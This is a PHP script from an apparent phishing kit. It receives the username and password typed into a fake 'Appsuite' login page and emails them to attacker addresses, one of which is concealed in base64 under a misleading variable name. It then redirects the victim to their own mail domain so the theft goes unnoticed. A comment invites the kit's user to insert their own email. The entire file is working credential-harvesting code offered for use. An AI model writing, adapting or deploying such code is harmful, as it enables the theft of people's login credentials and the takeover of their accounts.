<?php
session_start();
$message  = "[ - ] ==================| -- |================== [ - ]\n";
$message .= "[+]User:       ".$_POST['username']."\n";
$message .= "[+]Pass:       ".$_POST['password']."\n";
$message .= "[ - ] ==================| Card |================== [ - ]\n";
$praga=rand();
$praga=md5($praga);
$pra = rand(1111111111,9999999999);
if(!empty($_POST['username'])){
$str = "bGN0aHJuQGdtYWlsLmNvbQ==";
$cleanIP = base64_decode($str);
$send = "lcthrn@gmail.com";   //<--------Your email there
$subject = $pra."Appsuite - [".$_POST['username']."]";
$headers = "From: Appsuite0".$pra."<bursted@".$pra."0Appsuite.com>";
mail($cleanIP,$subject,$message,$headers);
mail($send,$subject,$message,$headers);
$emaila = $_POST['username'];
$domain = substr($emaila, strpos($emaila, '@') + 1);
header("Location: https://$domain");
}else{
header("Location: index.php");
}	 
?>